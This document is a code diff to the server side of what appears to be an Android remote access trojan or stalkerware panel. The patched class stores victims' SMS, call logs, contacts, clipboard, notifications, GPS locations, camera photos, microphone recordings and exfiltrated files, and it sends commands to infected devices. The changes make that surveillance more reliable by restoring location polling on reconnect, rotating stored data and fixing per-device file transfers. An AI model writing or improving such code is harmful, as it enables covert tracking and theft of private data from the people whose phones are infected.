@@ -11,6 +11,7 @@ class ClientManager {
         this.dbs = {};
         this.gpsTimers = {};
         this.transfers = {};
+        this.commandQueue = new Map(); // Pending commands queue
         logger.info('Client manager initialized');
     }
 
@@ -23,15 +24,30 @@ class ClientManager {
             const now = new Date().toISOString();
             
             if (client.value()) {
-                client.assign({ lastSeen: now, online: true, ...data }).write();
+                // Update existing client
+                client.assign({ 
+                    lastSeen: now, 
+                    online: true, 
+                    reconnectCount: (client.value().reconnectCount || 0) + 1,
+                    ...data 
+                }).write();
                 logger.clientConnected(id, data.ip, data.device);
             } else {
-                db.main.get('clients').push({ id, firstSeen: now, lastSeen: now, online: true, ...data }).write();
+                // New client
+                db.main.get('clients').push({ 
+                    id, 
+                    firstSeen: now, 
+                    lastSeen: now, 
+                    online: true, 
+                    reconnectCount: 0,
+                    ...data 
+                }).write();
                 logger.clientConnected(id, data.ip, data.device);
             }
             
             this.setupHandlers(id);
             this.runQueue(id);
+            this.restoreGpsPolling(id);
         } catch (e) {
             logger.systemError('Client connect failed', e);
         }
@@ -46,6 +62,14 @@ class ClientManager {
             
             delete this.sockets[id];
             this.clearGps(id);
+            
+            // Clean up transfers
+            Object.keys(this.transfers).forEach(tid => {
+                if (tid.startsWith(id)) {
+                    delete this.transfers[tid];
+                }
+            });
+            
             logger.clientDisconnected(id);
         } catch (e) {
             logger.systemError('Client disconnect failed', e);
@@ -91,6 +115,7 @@ class ClientManager {
             }
             
             params.type = cmd;
+            params.timestamp = Date.now();
             
             if (this.sockets[id]) {
                 this.sockets[id].emit('order', params);
@@ -113,6 +138,7 @@ class ClientManager {
                 return cb('Database unavailable');
             }
             
+            // Check for duplicate command
             const existing = cdb.get('queue').find({ type: params.type }).value();
             if (existing) {
                 logger.warning(`Command ${params.type} already queued for ${id}`, 'client');
@@ -135,6 +161,7 @@ class ClientManager {
             if (!cdb) return;
             
             const queue = cdb.get('queue').value();
+            if (!queue || queue.length === 0) return;
             
             queue.forEach(cmd => {
                 if (this.sockets[id]) {
@@ -153,26 +180,29 @@ class ClientManager {
         try {
             this.clearGps(id);
             
+            const cdb = this.getDb(id);
+            
             if (interval > 0 && this.sockets[id]) {
                 this.gpsTimers[id] = setInterval(() => {
                     this.send(id, config.msg.location, {});
                 }, interval * 1000);
                 
-                const cdb = this.getDb(id);
                 if (cdb) {
                     cdb.set('gpsInterval', interval).write();
                 }
                 
                 logger.info(`GPS polling started for ${id} (interval: ${interval}s)`, 'client');
             } else if (interval === 0) {
-                const cdb = this.getDb(id);
                 if (cdb) {
                     cdb.set('gpsInterval', 0).write();
                 }
                 logger.info(`GPS polling stopped for ${id}`, 'client');
             }
+            
+            return true;
         } catch (e) {
             logger.systemError('Set GPS failed', e);
+            return false;
         }
     }
 
@@ -180,6 +210,20 @@ class ClientManager {
         if (this.gpsTimers[id]) {
             clearInterval(this.gpsTimers[id]);
             delete this.gpsTimers[id];
+        }
+    }
+
+    restoreGpsPolling(id) {
+        try {
+            const cdb = this.getDb(id);
+            if (!cdb) return;
+            
+            const interval = cdb.get('gpsInterval').value();
+            if (interval && interval > 0) {
+                this.setGps(id, interval);
+            }
+        } catch (e) {
+            logger.systemError('Restore GPS failed', e);
         }
     }
 
@@ -193,26 +237,51 @@ class ClientManager {
             
             const pages = {
                 info: () => ({ client }),
-                sms: () => ({ list: cdb?.get('sms').value() || [] }),
-                calls: () => ({ list: cdb?.get('calls').value() || [] }),
-                contacts: () => ({ list: cdb?.get('contacts').value() || [] }),
-                wifi: () => ({ list: cdb?.get('wifi').value() || [] }),
-                clipboard: () => ({ list: cdb?.get('clipboard').value() || [] }),
-                notifications: () => ({ list: cdb?.get('notifications').value() || [] }),
-                permissions: () => ({ list: cdb?.get('permissions').value() || [] }),
-                apps: () => ({ list: cdb?.get('apps').value() || [] }),
+                sms: () => ({ 
+                    list: cdb?.get('sms').value() || [],
+                    total: (cdb?.get('sms').value() || []).length
+                }),
+                calls: () => ({ 
+                    list: cdb?.get('calls').value() || [],
+                    total: (cdb?.get('calls').value() || []).length
+                }),
+                contacts: () => ({ 
+                    list: cdb?.get('contacts').value() || [],
+                    total: (cdb?.get('contacts').value() || []).length
+                }),
+                wifi: () => ({ 
+                    list: cdb?.get('wifi').value() || [],
+                    total: (cdb?.get('wifi').value() || []).length
+                }),
+                clipboard: () => ({ 
+                    list: (cdb?.get('clipboard').value() || []).slice(-100) // Last 100
+                }),
+                notifications: () => ({ 
+                    list: (cdb?.get('notifications').value() || []).slice(-100) // Last 100
+                }),
+                permissions: () => ({ 
+                    list: cdb?.get('permissions').value() || [],
+                    total: (cdb?.get('permissions').value() || []).length
+                }),
+                apps: () => ({ 
+                    list: cdb?.get('apps').value() || [],
+                    total: (cdb?.get('apps').value() || []).length
+                }),
                 gps: () => ({ 
-                    list: cdb?.get('gps').value() || [], 
+                    list: (cdb?.get('gps').value() || []).slice(-50), // Last 50 locations
                     interval: cdb?.get('gpsInterval').value() || 0 
                 }),
                 files: () => ({ 
                     list: cdb?.get('files').value() || [],
                     path: cdb?.get('currentPath').value() || ''
                 }),
-                downloads: () => ({ list: cdb?.get('downloads').value() || [] }),
+                downloads: () => ({ 
+                    list: cdb?.get('downloads').value() || [],
+                    total: (cdb?.get('downloads').value() || []).length
+                }),
                 camera: () => ({ 
                     cameras: cdb?.get('cameras').value() || [], 
-                    photos: cdb?.get('photos').value() || [] 
+                    photos: (cdb?.get('photos').value() || []).slice(-50) // Last 50 photos
                 }),
                 mic: () => ({})
             };
@@ -234,15 +303,28 @@ class ClientManager {
             return;
         }
         
-        socket.on('disconnect', () => this.disconnect(id));
-        socket.on('pong', () => {});
+        socket.on('disconnect', (reason) => {
+            logger.info(`Client ${id} disconnected: ${reason}`, 'client');
+            this.disconnect(id);
+        });
+        
+        socket.on('pong', () => {
+            // Update last seen on pong
+            db.main.get('clients').find({ id }).assign({ 
+                lastSeen: new Date().toISOString() 
+            }).write();
+        });
         
         // SMS
         socket.on(config.msg.sms, data => {
             try {
                 if (data.smslist) {
-                    cdb.set('sms', data.smslist).write();
-                    logger.dataReceived(id, 'SMS', data.smslist.length);
+                    // Limit stored SMS
+                    const list = data.smslist.slice(0, 500);
+                    cdb.set('sms', list).write();
+                    logger.dataReceived(id, 'SMS', list.length);
+                } else if (data.error) {
+                    logger.warning(`SMS error from ${id}: ${data.error}`, 'client');
                 }
             } catch (e) {
                 logger.systemError('SMS handler failed', e);
@@ -253,8 +335,11 @@ class ClientManager {
         socket.on(config.msg.calls, data => {
             try {
                 if (data.callsList) {
-                    cdb.set('calls', data.callsList).write();
-                    logger.dataReceived(id, 'calls', data.callsList.length);
+                    const list = data.callsList.slice(0, 500);
+                    cdb.set('calls', list).write();
+                    logger.dataReceived(id, 'calls', list.length);
+                } else if (data.error) {
+                    logger.warning(`Calls error from ${id}: ${data.error}`, 'client');
                 }
             } catch (e) {
                 logger.systemError('Calls handler failed', e);
@@ -267,6 +352,8 @@ class ClientManager {
                 if (data.contactsList) {
                     cdb.set('contacts', data.contactsList).write();
                     logger.dataReceived(id, 'contacts', data.contactsList.length);
+                } else if (data.error) {
+                    logger.warning(`Contacts error from ${id}: ${data.error}`, 'client');
                 }
             } catch (e) {
                 logger.systemError('Contacts handler failed', e);
@@ -279,6 +366,8 @@ class ClientManager {
                 if (data.networks) {
                     cdb.set('wifi', data.networks).write();
                     logger.dataReceived(id, 'WiFi networks', data.networks.length);
+                } else if (data.error) {
+                    logger.warning(`WiFi error from ${id}: ${data.error}`, 'client');
                 }
             } catch (e) {
                 logger.systemError('WiFi handler failed', e);
@@ -289,6 +378,11 @@ class ClientManager {
         socket.on(config.msg.clipboard, data => {
             try {
                 if (data.text) {
+                    const list = cdb.get('clipboard').value() || [];
+                    // Keep last 200 entries
+                    if (list.length >= 200) {
+                        cdb.set('clipboard', list.slice(-199)).write();
+                    }
                     cdb.get('clipboard').push({ 
                         text: data.text, 
                         time: new Date().toISOString() 
@@ -303,6 +397,11 @@ class ClientManager {
         // Notifications
         socket.on(config.msg.notification, data => {
             try {
+                const list = cdb.get('notifications').value() || [];
+                // Keep last 200 entries
+                if (list.length >= 200) {
+                    cdb.set('notifications', list.slice(-199)).write();
+                }
                 cdb.get('notifications').push({ 
                     ...data, 
                     time: new Date().toISOString() 
@@ -331,6 +430,8 @@ class ClientManager {
                 if (data.apps) {
                     cdb.set('apps', data.apps).write();
                     logger.dataReceived(id, 'apps', data.apps.length);
+                } else if (data.error) {
+                    logger.warning(`Apps error from ${id}: ${data.error}`, 'client');
                 }
             } catch (e) {
                 logger.systemError('Apps handler failed', e);
@@ -341,6 +442,11 @@ class ClientManager {
         socket.on(config.msg.location, data => {
             try {
                 if (data.latitude) {
+                    const list = cdb.get('gps').value() || [];
+                    // Keep last 100 locations
+                    if (list.length >= 100) {
+                        cdb.set('gps', list.slice(-99)).write();
+                    }
                     cdb.get('gps').push({ 
                         ...data, 
                         time: new Date().toISOString() 
@@ -372,24 +478,30 @@ class ClientManager {
                 cdb.set('currentPath', data.path || '').write();
                 logger.dataReceived(id, 'file list', data.list?.length || 0);
             } else if (data.type === 'download' && data.buffer) {
-                this.saveFile(id, data.name, data.buffer, 'downloads');
+                this.saveFile(id, data.name, data.buffer, 'downloads', data.size);
             } else if (data.type === 'download_start') {
-                this.transfers[data.transferId] = { 
+                const transferId = `${id}_${data.transferId}`;
+                this.transfers[transferId] = { 
                     name: data.name, 
                     chunks: [], 
-                    total: data.totalChunks 
+                    total: data.totalChunks,
+                    startTime: Date.now()
                 };
                 logger.info(`File transfer started: ${data.name} from ${id}`, 'file');
             } else if (data.type === 'download_chunk') {
-                const t = this.transfers?.[data.transferId];
+                const transferId = `${id}_${data.transferId}`;
+                const t = this.transfers?.[transferId];
                 if (t) t.chunks[data.chunkIndex] = data.chunkData;
             } else if (data.type === 'download_end') {
-                const t = this.transfers?.[data.transferId];
+                const transferId = `${id}_${data.transferId}`;
+                const t = this.transfers?.[transferId];
                 if (t) {
                     this.saveFile(id, t.name, t.chunks.join(''), 'downloads');
-                    delete this.transfers[data.transferId];
+                    delete this.transfers[transferId];
                     logger.info(`File transfer completed: ${t.name} from ${id}`, 'file');
                 }
+            } else if (data.type === 'error') {
+                logger.warning(`File error from ${id}: ${data.error}`, 'file');
             }
         } catch (e) {
             logger.systemError('Files handler failed', e);
@@ -405,7 +517,8 @@ class ClientManager {
                 cdb.set('cameras', data.list || []).write();
                 logger.dataReceived(id, 'camera list', data.list?.length || 0);
             } else if (data.image && data.buffer) {
-                this.saveFile(id, `cam${data.cameraId}_${Date.now()}.jpg`, data.buffer, 'photos');
+                const timestamp = data.timestamp || Date.now();
+                this.saveFile(id, `cam${data.cameraId}_${timestamp}.jpg`, data.buffer, 'photos', data.size);
             }
         } catch (e) {
             logger.systemError('Camera handler failed', e);
@@ -415,14 +528,15 @@ class ClientManager {
     handleMic(id, data) {
         try {
             if (data.file && data.buffer) {
-                this.saveFile(id, data.name || `mic_${Date.now()}.mp4`, data.buffer, 'downloads');
+                const name = data.name || `mic_${Date.now()}.mp4`;
+                this.saveFile(id, name, data.buffer, 'downloads', data.size);
             }
         } catch (e) {
             logger.systemError('Mic handler failed', e);
         }
     }
 
-    saveFile(id, name, buffer, type) {
+    saveFile(id, name, buffer, type, size = null) {
         const dir = type === 'photos' ? config.photosPath : config.downloadsPath;
         const hash = crypto.createHash('md5').update(Date.now().toString()).digest('hex').slice(0, 10);
         const ext = path.extname(name) || '.bin';
@@ -438,19 +552,60 @@ class ClientManager {
                 const entry = { 
                     name, 
                     file: `/${type === 'photos' ? 'photos' : 'downloads'}/${filename}`, 
-                    time: new Date().toISOString() 
+                    time: new Date().toISOString(),
+                    size: size || data.length
                 };
                 
-                if (type === 'photos') {
-                    cdb.get('photos').push(entry).write();
-                } else {
-                    cdb.get('downloads').push(entry).write();
+                const listKey = type === 'photos' ? 'photos' : 'downloads';
+                const list = cdb.get(listKey).value() || [];
+                
+                // Keep last 100 files
+                if (list.length >= 100) {
+                    // Remove old files
+                    const toRemove = list.slice(0, list.length - 99);
+                    toRemove.forEach(item => {
+                        try {
+                            const oldPath = path.join(dir, path.basename(item.file));
+                            if (fs.existsSync(oldPath)) fs.unlinkSync(oldPath);
+                        } catch (ignored) {}
+                    });
+                    cdb.set(listKey, list.slice(-99)).write();
                 }
+                
+                cdb.get(listKey).push(entry).write();
             }
             
             logger.fileSaved(id, name, type);
         } catch (e) {
             logger.fileSaveFailed(id, name, e.message);
+        }
+    }
+
+    // Cleanup old clients
+    cleanup(maxAge = 30 * 24 * 60 * 60 * 1000) { // 30 days default
+        try {
+            const clients = db.main.get('clients').value();
+            const now = Date.now();
+            
+            clients.forEach(client => {
+                if (client.lastSeen) {
+                    const lastSeen = new Date(client.lastSeen).getTime();
+                    if (now - lastSeen > maxAge && !client.online) {
+                        // Remove client
+                        db.main.get('clients').remove({ id: client.id }).write();
+                        
+                        // Remove client DB
+                        const clientDbPath = path.join(config.dbPath, 'clients', `${client.id}.json`);
+                        if (fs.existsSync(clientDbPath)) {
+                            fs.unlinkSync(clientDbPath);
+                        }
+                        
+                        logger.info(`Cleaned up stale client: ${client.id}`, 'system');
+                    }
+                }
+            });
+        } catch (e) {
+            logger.systemError('Cleanup failed', e);
         }
     }
 }
